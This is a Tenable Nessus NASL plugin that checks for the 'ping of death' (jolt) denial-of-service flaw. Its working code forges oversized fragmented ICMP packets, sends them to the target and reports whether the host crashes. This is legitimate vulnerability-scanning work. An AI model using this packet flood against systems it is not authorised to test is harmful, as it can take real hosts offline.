#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11903);
 script_version ("$Revision: 1.9 $");
 
 script_name(english:"TCP/IP Ping of Death Remote DoS (jolt)");
 script_summary(english:"Crash target with a too long fragmented packets");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote operating system has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host crashed when pinged with an incorrectly fragmented\n",
     "packet.  This is known as the 'jolt' or 'ping of death' denial of\n",
     "service attack.  A remote attacker could exploit this to repeatedly\n",
     "crash this server."
   )
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Contact the operating system vendor for a patch."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C"
 );
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_family(english: "Denial of Service");
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

#
include("global_settings.inc");

if (report_paranoia < 2) exit(0);

if ( TARGET_IS_IPV6 ) exit(0);
id = rand() % 65536;

mtu = get_kb_item('ICMP/PMTU');
if (! mtu) mtu = get_kb_item('TCP/PMTU');
if (! mtu) mtu = 1500; 

maxdata = mtu - 20 - 8;	# IP + ICMP
maxdata = maxdata / 8; maxdata = maxdata * 8;
if (maxdata < 16) maxdata = 544;

dl = 65535 / (mtu - 20); 
dl ++;
dl *= maxdata;

src = this_host();

id = rand() % 65535 + 1;
seq = rand() % 256;

start_denial();
for (j = 0; j < dl; j=j+maxdata)
{
  datalen = dl - j;
  o = j / 8;
  if (datalen > maxdata) {
   o = o | 0x2000;
   datalen = maxdata;
  }

  ##display(string("j=", j, "; o=", o, ";dl=", datalen, "\n"));
  ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off:o,
                        ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
	     	        ip_src: src);
  icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
	     		  icmp_seq: seq, icmp_id:seq, data:crap(datalen-8));
  send_packet(icmp, pcap_active: 0);
}

alive = end_denial();
if(!alive)
{
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}

